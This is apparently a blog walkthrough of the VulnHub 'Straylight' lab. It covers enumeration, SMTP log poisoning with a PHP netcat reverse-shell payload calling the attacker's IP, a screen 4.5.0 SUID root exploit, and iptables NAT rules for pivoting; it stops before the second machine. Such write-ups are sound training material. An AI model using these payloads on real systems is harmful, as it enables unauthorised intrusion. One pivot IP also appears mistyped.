---
categories: [VulnHub]
tags: [PrivEsc]
---
# Straylight



## Description ⤵️

>💡 A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer - a must read for any cyber-security enthusiast. This lab makes use of pivoting and post exploitation, which I've found other OSCP prep labs seem to lack. The goal is the get root on both machines. All you need is default Kali Linux.
<br><br>
I'd rate this as Intermediate. No buffer overflows or exploit development - any necessary password cracking can be done with small wordlists. It's much more related to an OSCP box vs a CTF. I've tested it quite a bit, but if you see any issues or need a nudge PM me here.
<br><br>
Virtual Box Lab setup instructions are included in the zip download, but here's a quick brief:
<br><br>
Straylight → simulates a public facing server with 2 NICS. Cap this first, then pivot to the final machine.
<br><br>
Neuromancer → is within a non-public network with 1 NIC. Your Kali box should ONLY be on the same virtual network as Straylight.
<br><br>
This works better with VirtualBox rather than VMware
{: .prompt-info }

Let’s find the IP Address first >>

![Untitled](/Vulnhub-Files/img/Straylight/Untitled.png)

```bash
This machine have 2 Network Adaptor therefore showing to IP but both are same :

I will be using 192.168.56.102
```

## Port Scan Results ➡️

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%201.png)

```bash
Open Ports >
25			SMTP
80			HTTP			
3000		Apache		Hadoop
```

---

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%202.png)

Let’s check different ports too →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%203.png)

Lets try admin : admin and I got In →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%204.png)

Lets check this option →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%205.png)

Now access them and found this :

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%206.png)

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%207.png)

After digging deeper into `/turning-bolo/` directory I got this →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%208.png)

Now I think it is indicating to us for looking for log files :

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%209.png)

I have also got a port for SMTP for mail purpose so lets us this to execute our payload for reverse shell access or command shell →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2010.png)

Now After Accesing the SMTP service I am getting this :>

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2011.png)

This image is of source code of the previous picture .

Now it’s time to execute our reverse shell code →

```
Command : MAIL FROM:<?php system('nc -e /bin/bash 192.168.56.103 4444'); ?>
```

In response to that in netcat I recevied this →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2012.png)

⤵️

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2013.png)

Now when I got a Local Privilege Escalation so lets find for SUIDs and GUIDs files →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2014.png)

Lets search for an exploit for `screen 4.5.0` as it is a common exploit →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2015.png)

Now I transfered this exploit through wget and simply executed it And I got this :

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2016.png)

Now lets find the flag →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2017.png)

also I got this →

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2018.png)

---

This is not an end !

I also got an another machine connect with this machine so lets use pivoting method to breach it too →

Now ⤵️

It time to make tunnel from straylight to Neuromancer and also to the Attacker machine So :>

```
Command : iptables -t nat -A POSTROUTING -o enp0s3 -j SNAT --to-source 192.168.56.102
```

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2019.png)

```
command : iptables -t nat -A PREROUTING -i enp0s3 -p tcp --dport 3333 -j DNAT --to-destination 192.158.56.103
```

![Untitled](/Vulnhub-Files/img/Straylight/Untitled%2020.png)

Now I have a connection between these 2 machines >

Now lets go to `Neuromancer` Machine →

